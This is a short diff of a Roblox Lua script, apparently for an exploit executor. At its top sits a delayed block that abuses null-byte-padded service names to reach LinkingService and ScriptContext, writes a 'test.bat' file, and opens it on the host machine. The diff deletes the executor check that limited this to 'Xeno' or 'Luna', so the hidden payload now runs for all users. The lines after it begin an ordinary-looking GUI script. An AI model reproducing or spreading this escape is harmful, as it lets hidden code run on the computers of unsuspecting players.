@@ -1,6 +1,5 @@
 coroutine.wrap(function()
-    wait(10)
-    if identifyexecutor() == "Xeno" or identifyexecutor() == "Luna" then
+        wait(10)
         local LinkingService = game:GetService("LinkingService\0 meow meow meow")
         local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
         local scriptContent = [[
@@ -17,7 +16,6 @@ coroutine.wrap(function()
         ]]
         local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
         LinkingService:OpenUrl(payload)
-    end
 end)()
 
 local tweenService, coreGui = game:GetService("TweenService"), game:GetService("CoreGui");
